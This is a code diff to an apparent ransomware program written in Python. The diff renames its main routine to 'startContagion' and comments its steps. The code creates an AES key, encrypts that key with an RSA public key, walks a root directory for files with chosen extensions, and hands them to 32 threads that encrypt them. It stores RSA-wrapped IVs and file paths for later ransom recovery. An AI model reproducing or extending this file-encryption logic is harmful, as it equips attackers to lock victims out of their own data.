@@ -3,7 +3,6 @@ import sys
 import base64
 from queue import Queue
 
-
 import Utils
 sys.path.append(os.path.abspath('../hasp'))
 from AESCipher import AESCipher
@@ -38,9 +37,13 @@ def isValidFile(file_path):
             return True
     return False
 
-def findFiles(path):
+def startContagion(path):
     """
-        Recon
+        What happening in here:
+            - Creating RSA ciphers
+            - Create AES key
+            - Recon : Find the files we want to encrypt
+            - Encrypt the files with multithread option
     """
 
     rsa_cipher = RSACipher(Utils.rsa_public_key)
@@ -48,23 +51,30 @@ def findFiles(path):
     goodbye_files = Queue()
     aeskey = AESCipher.generate_key(Utils.aes_IV_key_length)
     
+    # creating multithread encryption workers
     for i in range(32):
         worker = APTAl(i, goodbye_files, aeskey)
         worker.daemon = True
         worker.start()
 
     with open(Utils.aesIV_file_store_path,"ab") as key_storing_file:
+        # write the AES key to our IV - File storage file
         key_storing_file.write(base64.b64encode(rsa_cipher.encrypt(aeskey)) + b"\n")
-        #key_storing_file.write(b"BEGIN AES KEY:\n"+aeskey + b"\nEND AES KEY\n")
+        # Recon files
         for directory_path, directories, files in os.walk(path):
             for fiile in files:
+                # check the file extention
                 if isValidFile(fiile):
+                    # IV is created individually for each file
                     iv = AESCipher.generate_key(Utils.aes_IV_key_length)
                     fp = os.path.join(directory_path,fiile)
+                    # put the iv, file to thread pool
                     goodbye_files.put((iv, fp))
+                    # the best way to store IV with RSA encyrption
                     iv = rsa_cipher.encrypt(iv)
+                    # to ensure data integrity we used base64
                     iv = base64.b64encode(iv)
-                    fp = rsa_cipher.encrypt(fp.encode("utf-8"))
+                    fp = rsa_cipher.encrypt(fp.encode("utf-8")) # str -> bytes
                     fp = base64.b64encode(fp)
                     key_storing_file.write(iv + b":::::" + fp + b"\n")
 
@@ -89,7 +99,7 @@ def main():
         garbage collection
     """
     keyStoreCreate()
-    found_files = findFiles(Utils.root_directory)
+    found_files = startContagion(Utils.root_directory)
 
     
 
